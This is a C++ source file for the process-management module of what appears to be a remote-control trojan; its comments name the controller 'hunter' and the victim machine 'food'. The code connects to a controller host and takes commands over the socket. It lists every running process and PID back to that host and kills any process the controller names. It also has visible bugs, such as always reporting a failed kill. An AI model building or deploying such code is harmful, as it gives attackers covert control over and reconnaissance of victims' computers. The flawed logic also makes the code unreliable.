#include "pch.h"
#include "Proc.h"

static Proc gProc;

Proc::Proc() {

	// hunter发送至食物
	CmdFreshProcs = "FRESH_PROCS";
	CmdKillProc = "KILL_PROC";
	// 食物发送至hunter
	CmdSendProc = "SEND_PROC";
	CmdKillProcSuccess = "KILL_SUCCESS";
	CmdKillProcFailed = "KILL_FAILED";
	// 分割与结束符
	CmdSplit = ";";
	CmdEnd = "\r\n";
}

void Proc::startByNewThread(std::string domain, int port)
{
	// 将域名和端口合并为一个char*
	// 这里new出来的空间在fileThreadProc中delete
	char* args = new char[MAX_PATH + sizeof(int)];
	domain.reserve(MAX_PATH);
	memcpy(args, domain.data(), MAX_PATH);
	memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

	// 传入刚出炉的char*参数
	HANDLE h = CreateThread(NULL, 0, Proc::procThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD Proc::procThreadProc(LPVOID args)
{
	// 获取传入的域名和端口信息
	char domain[MAX_PATH];
	memcpy(domain, args, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH));

	startProc(domain, port);
	// 不忘记delete
	delete [] (char*)args;
	return true;
}

void Proc::startProc(std::string domain, int port)
{
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server for proc\r\n");
	}

	OutputDebugStringA("Started proc\r\n");

	const int packetSize = 800;
	char szData[packetSize];
	int ret;
	std::string buf;

	while (true) {
		// 无数据会引起阻塞 防止占用cpu
		ret = sock.recvData(szData, packetSize);

		if (ret == SOCKET_ERROR || ret == 0) {
			break;
		}
		// 将收到的数据加入到buffer
		addDataToBuffer(&sock, buf, szData, ret);
	}

	OutputDebugStringA("Finished Proc\r\n");
}


void Proc::addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size)
{
	buf.append(data, size);

	// 分割每条命令和参数并执行
	int endIndex;
	while ((endIndex = buf.find(gProc.CmdEnd)) >= 0) {
		std::string line = buf.substr(0, endIndex);
		buf.erase(0, endIndex + gProc.CmdEnd.length());

		int firstSplit = line.find(gProc.CmdSplit);
		std::string cmd = line.substr(0, firstSplit);
		line.erase(0, firstSplit + gProc.CmdSplit.length());
		// 执行本命令
		processCmd(sock, cmd, line);
	}
}

// 解析出参数 返回映射 和食物主线程里的解析是一样的道理
std::map<std::string, std::string> Proc::parseArgs(std::string& data)
{
	std::vector<std::string> v;
	std::string::size_type pos1, pos2;
	pos2 = data.find(gProc.CmdSplit);
	pos1 = 0;
	while (std::string::npos != pos2) {
		v.push_back(data.substr(pos1, pos2 - pos1));
		pos1 = pos2 + gProc.CmdSplit.size();
		pos2 = data.find(gProc.CmdSplit, pos1);
	}
	if (pos1 != data.length()) v.push_back(data.substr(pos1));

	std::map<std::string, std::string> args;
	for (int i = 0; i < (int)v.size() - 1; i += 2) {
		args[v.at(i)] = v.at(i + 1);
	}

	return args;
}

void Proc::processCmd(TcpSocket* sock, std::string& cmd, std::string& data)
{
	std::map<std::string, std::string> args = parseArgs(data);

	if (cmd == gProc.CmdFreshProcs) {
		doFreshProcs(sock, args);
		return;
	}

	if (cmd == gProc.CmdKillProc) {
		doKillProc(sock, args);
		return;
	}
}

void Proc::doFreshProcs(TcpSocket* sock, std::map<std::string, std::string>& args) {

	int port = atoi(args["PORT"].data());
	startFreshProcsByNewThread(sock->mIp, port);
}

void Proc::doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args) {

	int port = atoi(args["PORT"].data());
	int pid = atoi(args["PID"].data());
	startKillProcByNewThread(sock->mIp, port, pid);
}

void Proc::startFreshProcsByNewThread(std::string domain, int port) {

	// 构造发送给线程函数的参数
	char* args = new char[MAX_PATH + sizeof(int)];

	// 确保有这么多空间的内容可以复制 否则会出错
	domain.reserve(MAX_PATH);
	memcpy(args, domain.data(), MAX_PATH);

	memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

	HANDLE h = CreateThread(NULL, 0, Proc::freshProcsThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

void Proc::startKillProcByNewThread(std::string domain, int port, int pid) {

	// 构造发送给线程函数的参数
	char* args = new char[MAX_PATH + sizeof(int) +sizeof(int)];

	// 确保有这么多空间的内容可以复制 否则会出错
	domain.reserve(MAX_PATH);
	memcpy(args, domain.data(), MAX_PATH);

	memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

	memcpy(args + MAX_PATH + sizeof(int), (char*)&pid, sizeof(int));

	HANDLE h = CreateThread(NULL, 0, Proc::killProcThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD Proc::freshProcsThreadProc(LPVOID args) {

	// 获取传进来的参数
	char domain[MAX_PATH];
	memcpy(domain, (char*)args, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH));
	// 真是一层层调用呀 一个sendFile就要好几个函数参与
	freshProcs(domain, port);
	// 释放为传参而申请的空间
	delete [] (char*)args;
	return true;
}

DWORD Proc::killProcThreadProc(LPVOID args) {

	// 获取传进来的参数
	char domain[MAX_PATH];
	memcpy(domain, (char*)args, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH));
	int pid = *((int*)((char*)args + MAX_PATH + sizeof(int)));
	// 真是一层层调用呀 一个sendFile就要好几个函数参与
	killProc(domain, port, pid);
	// 释放为传参而申请的空间
	delete [] (char*)args;
	return true;

}

void Proc::freshProcs(std::string domain, int port) {

	// 单独建立一个连接
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server to fresh procs\r\n");
		return;
	}

	std::string data; // 返回数据

	// 创建ctoolhelp对象来遍历进程快照
	CToolhelp thProcesses(TH32CS_SNAPPROCESS);
	PROCESSENTRY32 pe = { sizeof(pe) };
	BOOL fOk = thProcesses.ProcessFirst(&pe);
	for (; fOk; fOk = thProcesses.ProcessNext(&pe)) {
		// 把进程名称(不带路径)还有PID放进去
		// 先找exe名称 tcsrchr是查找字符串中某字符最后出现的位置
		PCTSTR pszExeFile = _tcsrchr(pe.szExeFile, TEXT('\\'));
		if (pszExeFile == NULL) {
			pszExeFile = pe.szExeFile;
		}
		else {
			pszExeFile++; // 跳过slash
		}

		CHAR szPid[8];
		_itoa_s((int)pe.th32ProcessID, szPid, sizeof(szPid), 10);
		// 拼接返回信息
		data.append(gProc.CmdSendProc + gProc.CmdSplit);
		data.append("EXENAME" + gProc.CmdSplit);
		data.append(pszExeFile + gProc.CmdSplit);
		data.append("PID" + gProc.CmdSplit);
		data.append(szPid + gProc.CmdEnd);
		// 发送
		sock.sendData(data.data(), data.size());
	}
}

void Proc::killProc(std::string domain, int port, int pid) {

	// 单独建立一个连接
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server to fresh procs\r\n");
		return;
	}

	std::string data; // 返回信息
	HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	do
	{
		if (hProc == NULL) {
			OutputDebugStringA("open process failed\r\n");
			break;
		}
		if (TerminateProcess(hProc, 0) == 0) {
			OutputDebugStringA("terminate process failed\r\n");
			break;
		}
		OutputDebugStringA("kill process successfully\r\n");
	} while (false);

	data.append(gProc.CmdKillProcFailed + gProc.CmdEnd);
	// 发送
	sock.sendData(data.data(), data.size());
}
